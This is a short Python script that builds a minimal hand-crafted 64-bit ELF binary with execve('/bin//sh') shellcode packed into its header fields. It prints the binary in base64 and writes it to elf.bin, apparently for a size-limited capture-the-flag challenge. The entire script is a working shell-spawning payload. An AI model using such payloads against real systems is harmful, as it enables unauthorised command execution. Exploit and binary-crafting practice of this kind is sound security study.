#!/usr/bin/env python3
import binascii
import base64

elf_data = binascii.unhexlify("7f454c46")
elf_data += binascii.unhexlify("48bf2f62696e2f2f7368eb04") # movabs $0x68732f2f6e69622f,%rdi, jmp +4
elf_data += binascii.unhexlify("02003e00")
elf_data += binascii.unhexlify("5257eb18") # 5257 - push rdx, push rdi, jmp +0x18
elf_data += binascii.unhexlify("01000000")
elf_data += binascii.unhexlify("010000001800000000000000")
elf_data += binascii.unhexlify("1800000001000000")
elf_data += binascii.unhexlify("546a3b58eb12") # push rsp; push 0x3b; pop rax; jmp +0x12
elf_data += binascii.unhexlify("38000100")
elf_data += binascii.unhexlify("0000000000000100000000000000")
elf_data += binascii.unhexlify("5f990f0500000000") # pop rdi; cdq; syscall

print(base64.b64encode(elf_data[:-4]))

fd = open('elf.bin', 'wb')
fd.write(elf_data)
fd.close()
